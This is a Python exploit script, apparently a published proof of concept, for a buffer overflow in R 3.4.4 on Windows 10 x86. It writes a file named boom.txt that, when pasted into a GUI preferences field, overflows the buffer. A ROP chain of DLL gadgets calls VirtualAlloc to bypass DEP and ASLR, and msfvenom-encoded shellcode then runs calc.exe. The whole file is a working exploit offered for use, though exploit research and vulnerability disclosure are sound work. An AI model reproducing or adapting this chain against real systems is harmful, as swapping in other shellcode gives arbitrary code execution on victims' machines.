#!/usr/bin/python


###############################################
#        R 3.4.4 Win10 x86  Buffer Overflow   # 
#               discovered by: bzyo           #
#           author: Charles Truscott          #
#           I love you Alison Thompson OAM    #
#           tested on: Windows 10 x86         #
#   rebooted for practice defeating ASLR/DEP  #
#                                             #
# --------------------------------------------#

##############################################

# GUI Preferences -> paste boom.txt into 'Language for menus ...' -> click OK

import struct

pad = "A" * 292

rop = struct.pack("L", 0x6cbef3c0)  # POP EAX # RETN [R.dll] 
rop += struct.pack("L", 0x6e732b48)  # ptr to &VirtualAlloc() [IAT R.dll]
rop += struct.pack("L", 0x6cba178c)  # MOV EAX,DWORD PTR DS:[EAX] # RETN [R.dll] 
rop += struct.pack("L", 0x6ca57139)  # XCHG EAX,ESI # RETN [R.dll] 
rop += struct.pack("L", 0x6bed7b2a)  # POP EBP # RETN [Rlapack.dll] 
rop += struct.pack("L", 0x6ca2a9bd)  # & jmp esp [R.dll]
rop += struct.pack("L", 0x6cbef3c0)  # POP EAX # RETN [R.dll] 
rop += struct.pack("L", 0xffffffff)  # Value to negate, will become 0x00000001
rop += struct.pack("L", 0x6397474a)  # NEG EAX # RETN [graphics.dll] 
rop += struct.pack("L", 0x6c94e84f)  # XCHG EAX,EBX # RETN [R.dll] 
rop += struct.pack("L", 0x6cbef3e4)  # POP EAX # RETN [R.dll] 
rop += struct.pack("L", 0xe7bf59f1)  # put delta into eax (-> put 0x00001000 into edx)
rop += struct.pack("L", 0x6fed580f)  # ADD EAX,1840B60F # RETN [grDevices.dll] 
rop += struct.pack("L", 0x6ca3485a)  # XCHG EAX,EDX # RETN [R.dll] 
rop += struct.pack("L", 0x63760b48)  # POP ECX # RETN [Rgraphapp.dll] 
rop += struct.pack("L", 0xffffffc0)  # Value to negate, will become 0x00000040
rop += struct.pack("L", 0x71364d80)  # NEG ECX # RETN [stats.dll] 
rop += struct.pack("L", 0x6fed44a0)  # POP EDI # RETN [grDevices.dll] 
rop += struct.pack("L", 0x6375fe5c)  # RETN (ROP NOP) [Rgraphapp.dll]
rop += struct.pack("L", 0x6c998dce)  # POP EAX # RETN [R.dll] 
rop += struct.pack("L", 0x90909090)  # nop
rop += struct.pack("L", 0x7135a86c)  # PUSHAD # RETN [stats.dll] 


nop = "A" * 20

# msfvenom -a x86 -p windows/exec -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x5c' cmd=calc.exe exitfunc=thread -f python

boom =  ""
boom += "\xdb\xce\xbf\x90\x28\x2f\x09\xd9\x74\x24\xf4\x5d\x29"
boom += "\xc9\xb1\x31\x31\x7d\x18\x83\xc5\x04\x03\x7d\x84\xca"
boom += "\xda\xf5\x4c\x88\x25\x06\x8c\xed\xac\xe3\xbd\x2d\xca"
boom += "\x60\xed\x9d\x98\x25\x01\x55\xcc\xdd\x92\x1b\xd9\xd2"
boom += "\x13\x91\x3f\xdc\xa4\x8a\x7c\x7f\x26\xd1\x50\x5f\x17"
boom += "\x1a\xa5\x9e\x50\x47\x44\xf2\x09\x03\xfb\xe3\x3e\x59"
boom += "\xc0\x88\x0c\x4f\x40\x6c\xc4\x6e\x61\x23\x5f\x29\xa1"
boom += "\xc5\x8c\x41\xe8\xdd\xd1\x6c\xa2\x56\x21\x1a\x35\xbf"
boom += "\x78\xe3\x9a\xfe\xb5\x16\xe2\xc7\x71\xc9\x91\x31\x82"
boom += "\x74\xa2\x85\xf9\xa2\x27\x1e\x59\x20\x9f\xfa\x58\xe5"
boom += "\x46\x88\x56\x42\x0c\xd6\x7a\x55\xc1\x6c\x86\xde\xe4"
boom += "\xa2\x0f\xa4\xc2\x66\x54\x7e\x6a\x3e\x30\xd1\x93\x20"
boom += "\x9b\x8e\x31\x2a\x31\xda\x4b\x71\x5f\x1d\xd9\x0f\x2d"
boom += "\x1d\xe1\x0f\x01\x76\xd0\x84\xce\x01\xed\x4e\xab\xee"
boom += "\x0f\x5b\xc1\x86\x89\x0e\x68\xcb\x29\xe5\xae\xf2\xa9"
boom += "\x0c\x4e\x01\xb1\x64\x4b\x4d\x75\x94\x21\xde\x10\x9a"
boom += "\x96\xdf\x30\xf9\x79\x4c\xd8\xd0\x1c\xf4\x7b\x2d"




end = "\xCC" * 588

poc = pad + rop + nop + boom + end

file = open("boom.txt", "w")
file.write(poc)
file.close
print "<3"
